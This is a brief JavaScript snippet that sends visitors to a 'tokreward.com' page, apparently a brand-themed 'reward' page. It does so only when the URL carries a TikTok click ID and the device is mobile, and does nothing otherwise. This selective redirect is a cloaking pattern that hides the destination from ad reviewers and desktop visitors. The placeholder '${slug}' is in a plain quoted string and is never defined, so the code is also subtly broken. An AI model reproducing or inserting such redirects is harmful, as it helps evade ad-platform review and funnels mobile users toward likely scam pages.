const utm = new URLSearchParams(window.location.search);
const ttclid = utm.get("ttclid");
const mobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
if (ttclid && mobile) { window.location.href = "https://tokreward.com/trshein.html?slug=${slug}"; } else { }
